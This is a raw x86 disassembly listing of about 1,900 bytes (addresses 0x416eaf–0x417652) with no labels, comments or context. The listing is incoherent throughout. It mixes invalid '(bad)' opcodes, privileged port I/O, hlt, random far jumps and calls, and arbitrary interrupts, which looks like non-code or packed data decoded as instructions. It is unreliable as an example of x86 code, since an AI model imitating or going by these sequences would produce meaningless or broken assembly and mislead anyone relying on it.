  416eaf:	lods   al,BYTE PTR ds:[esi]
  416eb0:	xor    al,0x9a
  416eb2:	cli    
  416eb3:	pop    eax
  416eb4:	icebp  
  416eb5:	fmul   st(6),st
  416eb7:	mov    esp,esp
  416eb9:	adc    esi,DWORD PTR [eax+0x25]
  416ebc:	aad    0x70
  416ebe:	jmp    0x255:0xeaddd1a7
  416ec5:	out    dx,eax
  416ec6:	xchg   ebx,eax
  416ec7:	lods   al,BYTE PTR ds:[esi]
  416ec8:	mov    DWORD PTR [ecx-0x53],esp
  416ecb:	add    bh,BYTE PTR [ebp+esi*2-0x4b2569f8]
  416ed2:	cld    
  416ed3:	cmp    DWORD PTR [ebx+0x20],ecx
  416ed6:	fxch   st(7)
  416ed8:	sar    DWORD PTR [ecx-0x14],0x89
  416edc:	(bad)  [esp+edi*1]
  416edf:	pop    edi
  416ee0:	int    0x8f
  416ee2:	fs xchg edi,eax
  416ee4:	cli    
  416ee5:	loop   0x416ed9
  416ee7:	fist   DWORD PTR [edi]
  416ee9:	push   ecx
  416eea:	pop    eax
  416eeb:	cdq    
  416eec:	(bad)  
  416eed:	out    dx,al
  416eee:	outs   dx,BYTE PTR ds:[esi]
  416eef:	test   eax,0x3c1283bc
  416ef4:	fist   DWORD PTR [esi]
  416ef6:	xchg   esi,eax
  416ef7:	pop    ecx
  416ef8:	mov    ch,0xa4
  416efa:	and    esi,DWORD PTR [esi]
  416efc:	fdiv   QWORD PTR [ebx+eax*4]
  416eff:	xor    DWORD PTR [edi+0x6e],eax
  416f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f03:	xchg   ebx,eax
  416f04:	sub    edx,DWORD PTR [ebx+0x665682af]
  416f0a:	dec    ebx
  416f0b:	pop    edx
  416f0c:	mov    eax,ds:0xe0f2bf02
  416f11:	dec    esi
  416f12:	or     dh,BYTE PTR [edx-0x117d5c6a]
  416f18:	add    al,0x4
  416f1a:	mov    ds:0x2a3acdc7,eax
  416f1f:	jg     0x416ee5
  416f21:	add    al,0x12
  416f23:	fdivr  QWORD PTR [ebp+eiz*8+0x25ad9daf]
  416f2a:	jns    0x416f7a
  416f2c:	add    eax,0xfd232889
  416f31:	sub    eax,0x1beb998c
  416f36:	sbb    ebp,esp
  416f38:	(bad)  
  416f39:	out    dx,al
  416f3a:	mov    dl,0xa2
  416f3c:	dec    eax
  416f3d:	pavgw  mm0,QWORD PTR [edx]
  416f40:	shl    BYTE PTR [eax+0x7b67d55f],cl
  416f46:	(bad)
  416f4a:	sahf   
  416f4b:	fdiv   DWORD PTR [ecx]
  416f4d:	test   al,0xf
  416f4f:	scas   eax,DWORD PTR es:[edi]
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	out    0x7b,eax
  416f6c:	mov    BYTE PTR [edi+esi*1],cl
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xa070707e
  416f77:	sub    al,0x5a
  416f79:	stos   DWORD PTR es:[edi],eax
  416f7a:	int    0xc7
  416f7c:	dec    ebp
  416f7d:	ret    
  416f7e:	ror    DWORD PTR [ebp-0x54d02188],1
  416f84:	jae    0x416fb4
  416f86:	dec    BYTE PTR [eax]
  416f88:	cdq    
  416f89:	popa   
  416f8a:	fadd   DWORD PTR [eax-0x61e060f6]
  416f90:	mov    esi,0x3b027505
  416f95:	mov    bl,0xd1
  416f97:	cdq    
  416f98:	xchg   ecx,eax
  416f99:	and    eax,0xf43d56b3
  416f9e:	xor    ebp,DWORD PTR [ebx-0x74]
  416fa1:	pop    ds
  416fa2:	xchg   ebx,eax
  416fa3:	call   0x714c:0x7d7915da
  416faa:	(bad)  
  416fab:	rcr    DWORD PTR [edx-0x8],1
  416fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416faf:	push   ebx
  416fb0:	cmp    al,0x54
  416fb2:	or     al,0x37
  416fb4:	adc    BYTE PTR [ebx-0x3f],dh
  416fb7:	addr16 js 0x416f44
  416fba:	inc    ebp
  416fbb:	cs dec eax
  416fbd:	fild   DWORD PTR [eax+0x56]
  416fc0:	mov    al,0x11
  416fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc3:	jg     0x416f71
  416fc5:	push   ebp
  416fc6:	(bad)  
  416fc8:	je     0x416ff0
  416fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fcb:	mov    al,0x12
  416fcd:	xlat   BYTE PTR ds:[ebx]
  416fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fcf:	test   al,0x56
  416fd1:	rcr    ch,0x1e
  416fd4:	push   ebp
  416fd5:	cmp    ebx,eax
  416fd7:	in     al,dx
  416fd8:	imul   eax,edi,0xffffffdd
  416fdb:	(bad)  
  416fdc:	jo     0x416fc2
  416fde:	out    dx,al
  416fdf:	adc    esp,esp
  416fe1:	and    al,0x8e
  416fe3:	and    BYTE PTR [esi+0xd5e0f1c],0x50
  416fea:	mov    edx,0x3dbe1902
  416fef:	push   esi
  416ff0:	add    bh,ah
  416ff2:	xchg   ebp,eax
  416ff3:	fstp   TBYTE PTR [edx+ecx*2]
  416ff6:	sar    DWORD PTR [edi+0x12],1
  416ff9:	add    al,0x67
  416ffb:	jg     0x416f90
  416ffd:	sbb    BYTE PTR [ebx+0x7f5cfe8a],cl
  417003:	and    BYTE PTR [ebp+0x6c],ah
  417006:	sub    BYTE PTR [ebx+0x7fe5c49e],dl
  41700c:	mov    dl,0xac
  41700e:	inc    esi
  41700f:	xor    BYTE PTR [eax+0x11ec87c1],bh
  417015:	jmp    0x416ffa
  417017:	jb     0x416ff5
  417019:	fnstsw WORD PTR [eax+0x74]
  41701c:	cmp    DWORD PTR [ebx-0x28],esp
  41701f:	call   0xbb96787
  417024:	ficom  WORD PTR [eax]
  417026:	int    0xc1
  417028:	(bad)  ss:0x803c2881
  41702f:	xor    eax,0xf92775e8
  417034:	adc    BYTE PTR [ebx+0x560205a9],al
  41703a:	mov    eax,DWORD PTR [edx-0x44]
  41703d:	(bad)  
  41703f:	mov    DWORD PTR [edi],eax
  417041:	dec    esp
  417042:	xor    dh,BYTE PTR [ecx+0x3e8ef332]
  417048:	shr    BYTE PTR [ebp+0x4b],1
  41704b:	lock test eax,0xfc6ef7c4
  417051:	mov    bl,dh
  417053:	int    0x57
  417055:	mov    bl,0x57
  417057:	hlt    
  417058:	push   es
  417059:	iret   
  41705a:	mov    eax,ds:0xff365b0a
  41705f:	or     eax,0x87b74577
  417064:	clc    
  417065:	fsubr  DWORD PTR [esi]
  417067:	inc    edx
  417068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417069:	outs   dx,DWORD PTR ds:[esi]
  41706a:	stos   DWORD PTR es:[edi],eax
  41706b:	cmp    ah,BYTE PTR [edx+0x59]
  41706e:	mov    ecx,0xdb04c98e
  417073:	nop
  417074:	int    0x73
  417076:	add    cl,BYTE PTR [eax+ebp*4]
  417079:	test   BYTE PTR [esi+0x774920de],al
  41707f:	jno    0x4170af
  417081:	sti    
  417082:	lds    ebp,FWORD PTR [eax+eax*4-0x4f]
  417086:	or     al,BYTE PTR [edx+0x2d]
  417089:	xor    BYTE PTR [edi],ch
  41708b:	pop    eax
  41708c:	push   ss
  41708d:	or     bh,BYTE PTR [ecx+ebp*2-0xf]
  417091:	dec    esi
  417092:	xor    al,0xa4
  417094:	adc    dh,cl
  417096:	add    edx,DWORD PTR [ecx]
  417098:	nop
  417099:	js     0x417042
  41709b:	and    edi,ecx
  41709d:	pop    ecx
  41709e:	sti    
  41709f:	push   cs
  4170a0:	out    0xe4,al
  4170a2:	cdq    
  4170a3:	mov    ah,0x12
  4170a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170a6:	in     eax,dx
  4170a7:	push   edx
  4170a8:	xchg   esi,eax
  4170a9:	xchg   esp,eax
  4170aa:	mov    DWORD PTR [eax-0x610e4824],esi
  4170b0:	aam    0xf2
  4170b2:	sub    dl,bh
  4170b4:	push   0x41
  4170b6:	push   es
  4170b7:	push   ecx
  4170b8:	cmp    BYTE PTR [eax-0x11],ah
  4170bb:	mov    al,ds:0xa399aba9
  4170c0:	das    
  4170c1:	pop    esp
  4170c2:	mov    ch,BYTE PTR [ebx+0x30766b69]
  4170c8:	mov    DWORD PTR [ebx+0x1c],eax
  4170cb:	mov    ah,0xfa
  4170cd:	dec    esi
  4170ce:	lods   eax,DWORD PTR ds:[esi]
  4170cf:	push   es
  4170d0:	ffree  st(5)
  4170d2:	add    BYTE PTR [ecx-0x25d5e489],dh
  4170d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170d9:	mov    ds:0x4428b9e,eax
  4170de:	mov    esi,0x46472d10
  4170e3:	scas   al,BYTE PTR es:[edi]
  4170e4:	pop    ss
  4170e5:	cmp    DWORD PTR [edx],esp
  4170e7:	scas   eax,DWORD PTR es:[edi]
  4170e8:	add    esp,ecx
  4170ea:	xchg   edi,eax
  4170eb:	or     ecx,DWORD PTR [ecx]
  4170ed:	sahf   
  4170ee:	push   esi
  4170ef:	push   esp
  4170f0:	mov    ebx,0x5548be73
  4170f5:	stos   BYTE PTR es:[edi],al
  4170f6:	pop    ds
  4170f7:	lock out dx,al
  4170f9:	dec    edi
  4170fa:	mov    al,0xf7
  4170fc:	(bad)  
  4170fd:	and    edx,esp
  4170ff:	and    DWORD PTR [eax+0x52],edi
  417102:	or     edx,DWORD PTR [ebx]
  417104:	mov    WORD PTR [ecx],es
  417106:	out    0x9e,eax
  417108:	add    eax,0x8b11c2bf
  41710d:	aas    
  41710e:	stos   DWORD PTR es:[edi],eax
  41710f:	mov    edi,0xca2c3431
  417114:	popf   
  417115:	out    dx,al
  417116:	inc    edi
  417117:	stos   DWORD PTR es:[edi],eax
  417118:	out    0x47,al
  41711a:	fnsave [edi+ebx*2]
  41711d:	lods   eax,DWORD PTR ds:[esi]
  41711e:	cld    
  41711f:	or     eax,DWORD PTR [ecx+0x1a]
  417122:	lods   eax,DWORD PTR ds:[esi]
  417123:	sahf   
  417124:	stos   BYTE PTR es:[edi],al
  417125:	jnp    0x4170b3
  417127:	mov    eax,0xd091e301
  41712c:	xchg   esp,eax
  41712d:	add    ecx,DWORD PTR [ecx-0x5a3b4fb1]
  417133:	push   esp
  417134:	adc    DWORD PTR [ebp-0x1],esp
  417137:	sub    eax,0x1da16288
  41713c:	cmp    eax,0xdb7175b8
  417141:	sub    ebp,DWORD PTR [eax-0x2ca365b6]
  417147:	dec    eax
  417148:	mov    ebx,0xeb9ed9
  41714d:	fcom   st(2)
  41714f:	(bad)  
  417150:	imul   esi,DWORD PTR [edi-0x2256c79a],0xcfad444d
  41715a:	dec    ecx
  41715b:	adc    eax,0x43795c16
  417160:	xchg   ecx,eax
  417161:	mov    BYTE PTR [eax-0x6e],cl
  417164:	add    eax,0x25cea47b
  417169:	cmp    eax,0x4b7272e4
  41716e:	mov    ecx,0xe6169b3a
  417173:	je     0x417107
  417175:	xchg   BYTE PTR [edx+0x1c],dl
  417178:	les    ebp,FWORD PTR [esi+0x4]
  41717b:	jmp    0x41713b
  41717d:	cmp    eax,0xc88327f8
  417182:	outs   dx,BYTE PTR ds:[esi]
  417183:	ins    BYTE PTR es:[edi],dx
  417184:	rcr    BYTE PTR [esi-0x73],cl
  417187:	test   ecx,0x2daebe87
  41718d:	pop    esi
  41718e:	imul   ecx,DWORD PTR [ebp+ebx*8+0x4c83c699],0xfffffffa
  417196:	lods   al,BYTE PTR ds:[esi]
  417197:	(bad)  
  417198:	shl    BYTE PTR [ebx-0x56],1
  41719b:	das    
  41719c:	mov    fs,WORD PTR ss:[esi+0x72]
  4171a0:	cmp    DWORD PTR [ebx-0xb],ecx
  4171a3:	in     al,0x9f
  4171a5:	arpl   si,bx
  4171a7:	loopne 0x417215
  4171a9:	cmc    
  4171aa:	push   esi
  4171ab:	fld    DWORD PTR [edi-0x4b5516b8]
  4171b1:	jmp    0xcda9:0x6b759f4e
  4171b8:	mov    al,0xa4
  4171ba:	int    0xf3
  4171bc:	in     al,dx
  4171bd:	mov    ch,0xbd
  4171bf:	hlt    
  4171c0:	xchg   ebx,eax
  4171c1:	loop   0x4171ff
  4171c3:	xlat   BYTE PTR ds:[ebx]
  4171c4:	int3   
  4171c5:	bound  eax,QWORD PTR [edx-0x27034a8a]
  4171cb:	pop    edx
  4171cc:	lock call 0xa955:0x52e79ba2
  4171d4:	(bad)  
  4171d5:	and    esp,DWORD PTR [eax+0x55]
  4171d8:	lea    edi,[ecx-0x25aa19bd]
  4171de:	sbb    al,0xc
  4171e0:	or     ebp,ecx
  4171e2:	gs add eax,0x61db1beb
  4171e8:	inc    eax
  4171e9:	adc    ecx,DWORD PTR [ecx-0x7b26fa6d]
  4171ef:	jp     0x4171fd
  4171f1:	cmp    eax,0x1f086e49
  4171f6:	fwait
  4171f7:	arpl   WORD PTR [esi+0x6c5411f],sp
  4171fd:	jmp    0xfa71:0xa49d08c1
  417204:	(bad)  
  417205:	mov    edi,0xba7eb9bb
  41720a:	fldpi  
  41720c:	jb     0x417221
  41720e:	push   edi
  41720f:	mov    ah,0x8d
  417211:	cmp    al,0x5c
  417213:	stc    
  417214:	dec    ebx
  417215:	sbb    DWORD PTR [esi-0x3a6bd48d],ecx
  41721b:	inc    edi
  41721c:	mov    eax,ds:0x5e2548d2
  417221:	hlt    
  417222:	int3   
  417223:	push   esi
  417224:	sbb    ebp,DWORD PTR [ebp-0x79]
  417227:	jno    0x41727f
  417229:	call   0x517646ec
  41722e:	inc    ebp
  41722f:	pop    es
  417230:	jno    0x417207
  417232:	cmp    BYTE PTR gs:[edx],bh
  417235:	cwde   
  417236:	scas   al,BYTE PTR es:[edi]
  417237:	ins    DWORD PTR es:[edi],dx
  417238:	cmp    BYTE PTR [ecx],0x21
  41723b:	inc    esp
  41723c:	mov    ds:0x1c03434a,al
  417241:	sbb    cl,BYTE PTR [ebx-0x17]
  417244:	fild   WORD PTR [edx]
  417246:	add    BYTE PTR [eax],al
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	ds pop ds
  417256:	dec    esp
  417257:	xchg   ecx,eax
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x7e70707e
  417261:	xchg   ebp,eax
  417262:	sbb    edx,DWORD PTR [esp+edi*8]
  417265:	mov    ds:0x232cf46f,eax
  41726a:	mov    esp,0xd61da04b
  41726f:	mov    ds:0x7acfbef,eax
  417274:	xor    eax,0xeaa9cacb
  417279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727a:	cmp    BYTE PTR [edi-0x29],dl
  41727d:	mul    DWORD PTR [ebx-0x29]
  417280:	jo     0x4172f9
  417282:	xor    ebp,DWORD PTR [edx]
  417284:	arpl   WORD PTR [eax],bp
  417286:	sbb    BYTE PTR [eax+0x5dbab06e],ah
  41728c:	daa    
  41728d:	(bad)  
  41728e:	ins    BYTE PTR es:[edi],dx
  41728f:	push   esp
  417290:	add    BYTE PTR [edx-0x58],al
  417293:	add    eax,0xa1cced37
  417298:	lods   eax,DWORD PTR ds:[esi]
  417299:	loope  0x41724a
  41729b:	mov    cl,bl
  41729d:	fistp  DWORD PTR [edx+0x6a]
  4172a0:	mul    DWORD PTR ds:0xecf6fad1
  4172a6:	pushf  
  4172a7:	pop    edi
  4172a8:	cmp    DWORD PTR [eax-0x3ab1486b],0x6
  4172af:	sub    bl,BYTE PTR [ebx+0x43]
  4172b2:	adc    ch,dh
  4172b4:	fidiv  DWORD PTR [edx-0x67a80d28]
  4172ba:	movlps xmm4,QWORD PTR [edx+ecx*2]
  4172be:	scas   eax,DWORD PTR es:[edi]
  4172bf:	xchg   ecx,eax
  4172c0:	mov    ds:0x7ad48164,eax
  4172c5:	or     eax,0x7ec97ad6
  4172ca:	int    0x0
  4172cc:	add    BYTE PTR [esp+esi*8],bh
  4172cf:	mov    DWORD PTR ds:0x1e67a9d5,edi
  4172d5:	xor    esp,DWORD PTR ds:0xe83cafd6
  4172db:	call   0x29767d
  4172e0:	mov    ecx,ss
  4172e2:	and    DWORD PTR [esi-0x6f1e459d],0xfffffff9
  4172e9:	cmp    BYTE PTR [edx],ch
  4172eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ec:	and    al,0x31
  4172ee:	mov    ds:0xf753c178,eax
  4172f3:	outs   dx,BYTE PTR ds:[esi]
  4172f4:	and    dh,ch
  4172f6:	push   ds
  4172f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f8:	(bad)  
  4172f9:	jnp    0x41732d
  4172fb:	inc    ebp
  4172fc:	rcr    DWORD PTR [ebp+0x63],1
  4172ff:	ins    BYTE PTR es:[edi],dx
  417300:	inc    ebp
  417301:	mov    al,BYTE PTR [ebp+0x7d0a508a]
  417307:	sbb    al,0x1a
  417309:	or     esp,DWORD PTR [esi-0x6f895b15]
  41730f:	mov    dh,0xfa
  417311:	js     0x4172a4
  417313:	lea    ebx,[edi-0x3d]
  417316:	retf   0xf253
  417319:	xchg   esp,eax
  41731a:	lds    esi,FWORD PTR [esi]
  41731c:	mov    esp,0xbbc51c34
  417321:	repnz sbb edx,DWORD PTR [ecx+0x4fbfe8a3]
  417328:	jp     0x4172f2
  41732a:	mov    ah,0x1f
  41732c:	mov    fs,WORD PTR [ecx+edi*8+0x6c66f2e5]
  417333:	and    al,0xd4
  417335:	loop   0x417377
  417337:	push   0x9
  417339:	cdq    
  41733a:	data16 mov ah,0x36
  41733d:	pop    ebp
  41733e:	sub    esp,DWORD PTR [ecx-0x5d]
  417341:	sahf   
  417342:	(bad)  
  417343:	(bad)  
  417344:	popf   
  417345:	fdiv   DWORD PTR [ecx+0x6a413715]
  41734b:	mov    ds:0x77db6498,al
  417350:	push   esp
  417351:	(bad)  
  417352:	xchg   ebp,eax
  417353:	sub    BYTE PTR [edx+0x4],al
  417356:	mov    ebx,0xae8ce02e
  41735b:	mov    ebp,0x5ea5265c
  417360:	pushf  
  417361:	jbe    0x41737d
  417363:	inc    edi
  417364:	xor    DWORD PTR [edi+0x1a],esi
  417367:	mov    DWORD PTR [ecx+0x6a],ecx
  41736a:	and    eax,DWORD PTR [edi+0x4f3c5353]
  417370:	mov    dh,0x53
  417372:	imul   DWORD PTR [ebx]
  417374:	dec    edi
  417375:	push   ebp
  417376:	mov    ebx,0xb22c94d8
  41737b:	or     eax,0x2f75769d
  417380:	test   al,0x19
  417382:	dec    ecx
  417383:	and    al,0x60
  417385:	lahf   
  417386:	bound  esp,QWORD PTR [edi]
  417388:	and    al,BYTE PTR [eax]
  41738a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41738b:	mov    al,ds:0x6dae9170
  417390:	pop    edx
  417391:	js     0x41736b
  417393:	and    eax,0x915ef6ea
  417398:	xor    edx,edi
  41739a:	jb     0x417320
  41739c:	sbb    dl,BYTE PTR [edx]
  41739e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41739f:	add    DWORD PTR [esi],ecx
  4173a1:	sub    al,dl
  4173a3:	add    BYTE PTR [ebx],dh
  4173a5:	imul   edx,DWORD PTR [ebp+0x3],0xeef607d9
  4173ac:	addr16 sahf 
  4173ae:	pop    ebx
  4173af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173b0:	or     edx,esi
  4173b2:	gs sub eax,0xda72334e
  4173b8:	aad    0xc1
  4173ba:	mov    cl,0x29
  4173bc:	aad    0x48
  4173be:	call   0x3a7dbe70
  4173c3:	dec    ebx
  4173c4:	ficom  WORD PTR [eax+eiz*8+0x7b]
  4173c8:	ja     0x417389
  4173ca:	adc    edx,DWORD PTR [ecx-0x706c933b]
  4173d0:	int3   
  4173d1:	shr    BYTE PTR [ebx],0xa8
  4173d4:	out    dx,eax
  4173d5:	push   edi
  4173d6:	adc    eax,0x6722c011
  4173db:	mov    eax,0xbe08d4d2
  4173e0:	cmc    
  4173e1:	ficomp DWORD PTR [edx+edx*1]
  4173e4:	imul   eax,DWORD PTR [ebx-0x4e],0x7c
  4173e8:	call   0x2e2a:0x91021512
  4173ef:	and    ecx,ecx
  4173f1:	sar    DWORD PTR [eax-0x1b],1
  4173f4:	sub    eax,0xd00b20fb
  4173f9:	je     0x4173e9
  4173fb:	push   ebx
  4173fc:	outs   dx,BYTE PTR ds:[esi]
  4173fd:	loope  0x41739e
  4173ff:	inc    edx
  417400:	enter  0x2285,0xa6
  417404:	cmp    ah,bl
  417406:	lods   eax,DWORD PTR ds:[esi]
  417407:	pop    ebp
  417408:	(bad)  
  417409:	aad    0x29
  41740b:	push   ebp
  41740c:	mov    ds:0x19849080,eax
  417411:	arpl   si,bx
  417413:	adc    al,0xfd
  417415:	sbb    dl,ah
  417417:	dec    edi
  417418:	int    0xf0
  41741a:	xchg   DWORD PTR [eax+0x1],esi
  41741d:	sti    
  41741e:	dec    ebx
  41741f:	xchg   ecx,eax
  417420:	aas    
  417421:	jecxz  0x41740f
  417423:	mov    ds:0x5ab3abd,al
  417428:	out    0x9,eax
  41742a:	ds sub eax,esi
  41742d:	test   eax,0xf89382ac
  417432:	dec    edx
  417433:	push   esp
  417434:	pop    esi
  417435:	test   DWORD PTR [esi],eax
  417437:	mov    ebx,0x8c3e488e
  41743c:	mov    bl,0x65
  41743e:	xor    al,BYTE PTR [edi-0x5c]
  417441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417442:	in     al,0x20
  417444:	and    BYTE PTR [ebx],ah
  417446:	mov    al,0x64
  417448:	inc    ebp
  417449:	cmp    BYTE PTR es:[edx],al
  41744c:	int3   
  41744d:	fistp  DWORD PTR [ecx+edi*8+0x66]
  417451:	and    eax,0x5b9c3ecf
  417456:	cs mov ebp,0xed4ded9a
  41745c:	pop    ds
  41745d:	aad    0xbf
  41745f:	pop    eax
  417460:	jmp    0x417459
  417462:	jo     0x417463
  417464:	mov    esi,0x1f9a16cb
  417469:	cdq    
  41746a:	sbb    dh,dh
  41746c:	sbb    edi,esp
  41746e:	xchg   DWORD PTR [ebx-0x6f5168ba],esp
  417474:	dec    edi
  417475:	retf   
  417476:	mov    eax,0x3fbc427b
  41747b:	add    BYTE PTR [eax],dh
  41747d:	clc    
  41747e:	fcmovbe st,st(5)
  417480:	rol    DWORD PTR [ebp-0x4c],cl
  417483:	pop    eax
  417484:	jg     0x417437
  417486:	shr    BYTE PTR [edi+0x1301d4fa],0xc2
  41748d:	jg     0x417435
  41748f:	mov    dl,BYTE PTR [edi-0x41]
  417492:	test   eax,0x4584bc06
  417497:	mov    ds:0x5c33c0b,al
  41749c:	clc    
  41749d:	das    
  41749e:	sar    BYTE PTR [esi+0x41be7ee9],0x4e
  4174a5:	or     ah,ch
  4174a7:	and    eax,0xe806c8d8
  4174ac:	sbb    al,0xe3
  4174ae:	(bad)  
  4174af:	js     0x4174e1
  4174b1:	inc    edi
  4174b2:	repnz push esi
  4174b4:	jmp    0xa4a9:0xec1869ea
  4174bb:	xchg   esi,eax
  4174bc:	(bad)  
  4174bd:	mov    esi,0x73201511
  4174c2:	dec    esi
  4174c3:	shl    DWORD PTR [ebp+edi*1+0x62dc898d],0x6e
  4174cb:	sbb    al,0xc6
  4174cd:	mov    esi,0xf3d41f10
  4174d2:	jae    0x417517
  4174d4:	add    eax,ecx
  4174d6:	enter  0x54f3,0xc8
  4174da:	sub    al,0x32
  4174dc:	or     ebp,0xffffffbd
  4174df:	lods   al,BYTE PTR ds:[esi]
  4174e0:	or     eax,0xb8ccab1a
  4174e5:	std    
  4174e6:	xor    edi,esi
  4174e8:	popa   
  4174e9:	mov    ebp,0x20501f69
  4174ee:	ror    BYTE PTR ds:0x92943a5b,1
  4174f4:	mov    al,0xf7
  4174f6:	scas   al,BYTE PTR es:[edi]
  4174f7:	mov    esi,0xc079e61b
  4174fc:	test   BYTE PTR ds:[ebx-0x8],dh
  417500:	xchg   edx,eax
  417501:	ins    BYTE PTR es:[edi],dx
  417502:	adc    ebp,eax
  417504:	mov    esi,0x6c01b368
  417509:	xchg   dh,ah
  41750b:	add    eax,0xf68aa028
  417510:	mov    dl,0x43
  417512:	std    
  417513:	mov    dl,0xfd
  417515:	daa    
  417516:	stos   DWORD PTR es:[edi],eax
  417517:	push   0x60
  417519:	(bad)  
  41751a:	sahf   
  41751b:	jle    0x417520
  41751d:	shl    DWORD PTR [esi+0x566313d1],1
  417523:	ja     0x417579
  417525:	rcl    BYTE PTR [edx],cl
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ebx-0x46da7458],ebp
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x4175b3
  41754f:	repz sub ch,BYTE PTR [ecx]
  417552:	cmp    BYTE PTR [eax],al
  417554:	pop    ebp
  417555:	dec    esi
  417556:	lock mov dh,0x2a
  417559:	(bad)  
  41755a:	or     esp,DWORD PTR [ebx]
  41755c:	jno    0x417553
  41755e:	lahf   
  41755f:	pushf  
  417560:	mov    ebx,0x30fcd164
  417565:	xor    DWORD PTR [esp+eiz*8+0x37],esp
  417569:	sbb    DWORD PTR [edx+0x44bf3753],ecx
  41756f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417570:	add    eax,DWORD PTR [ebp-0x34]
  417573:	aaa    
  417574:	cmp    BYTE PTR [ecx+ecx*1+0x7b],bl
  417578:	leave  
  417579:	clc    
  41757a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41757b:	repz add DWORD PTR [ecx-0x2a],edx
  41757f:	mov    esi,0xb8506c6c
  417584:	or     eax,0xec4515bb
  417589:	mov    WORD PTR [edi],es
  41758b:	fucomp st(7)
  41758d:	mov    esp,ds
  41758f:	(bad)  
  417590:	dec    ebx
  417591:	xor    ch,bh
  417593:	pop    es
  417594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417595:	dec    ebp
  417596:	scas   al,BYTE PTR es:[edi]
  417597:	int    0x1d
  417599:	mov    bh,0x6f
  41759b:	push   ecx
  41759c:	test   eax,0x418624ca
  4175a1:	idiv   ch
  4175a3:	xlat   BYTE PTR ds:[ebx]
  4175a4:	lea    ebp,[edi-0x47]
  4175a7:	cmp    ecx,DWORD PTR [esi-0x76f6a54c]
  4175ad:	dec    eax
  4175ae:	inc    esp
  4175af:	in     eax,0x77
  4175b1:	xor    cl,bh
  4175b3:	add    al,0x65
  4175b5:	gs enter 0x22a5,0xfe
  4175ba:	xchg   BYTE PTR [esi+0x35],cl
  4175bd:	sti    
  4175be:	add    DWORD PTR gs:[ebp-0x5],esi
  4175c2:	(bad)  
  4175c3:	ins    DWORD PTR es:[edi],dx
  4175c4:	gs dec esp
  4175c6:	mov    bh,0x46
  4175c8:	mul    BYTE PTR [ecx-0x5d67ae32]
  4175ce:	and    DWORD PTR [esi-0x73165bfc],ebx
  4175d4:	push   ss
  4175d5:	cmp    ebx,DWORD PTR [ebp-0x1ccc29f8]
  4175db:	pop    edx
  4175dc:	fdivp  st(2),st
  4175de:	mov    edi,0xe381130a
  4175e3:	mov    ebp,DWORD PTR [edx]
  4175e5:	sbb    edi,ebx
  4175e7:	lods   eax,DWORD PTR ds:[esi]
  4175e8:	in     eax,0xde
  4175ea:	sub    BYTE PTR [edx-0x403bc43b],dh
  4175f0:	es call 0xcb0aa94b
  4175f6:	fidivr WORD PTR [esi+esi*1-0x2f]
  4175fa:	test   BYTE PTR [esp+ecx*2+0x2],bh
  4175fe:	mov    ebp,0xb206e4f7
  417603:	and    eax,0x7649d3ee
  417608:	and    al,0xc9
  41760a:	mov    ecx,0x8630637
  41760f:	inc    ebx
  417610:	and    DWORD PTR [ecx-0x2d],ecx
  417613:	int    0x55
  417615:	ja     0x4175dc
  417617:	cwde   
  417618:	lods   eax,DWORD PTR ds:[esi]
  417619:	inc    eax
  41761a:	jle    0x41766e
  41761c:	pop    ecx
  41761d:	scas   eax,DWORD PTR es:[edi]
  41761e:	ret    0x1509
  417621:	jne    0x4175ed
  417623:	shr    BYTE PTR [ebx-0x44],cl
  417626:	mov    eax,0x546669bf
  41762b:	sub    BYTE PTR [esi-0x3b],dh
  41762e:	add    esi,DWORD PTR [ebp+edx*2-0x71]
  417632:	push   ds
  417633:	(bad)  
  417634:	cmp    al,0x33
  417636:	push   esi
  417637:	xor    ecx,ecx
  417639:	mov    cl,0x70
  41763b:	push   esi
  41763c:	xchg   ecx,eax
  41763d:	add    eax,0xe5b5399c
  417642:	sbb    al,0xe4
  417644:	xor    ch,BYTE PTR [eax]
  417646:	iret   
  417647:	jnp    0x4176bf
  417649:	into   
  41764a:	pusha  
  41764b:	push   edx
  41764c:	jnp    0x4176bd
  41764e:	sub    BYTE PTR [eax+esi*8+0x45],bl
  417652:	sbb    eax,DWORD PTR [esi-0x23523898]
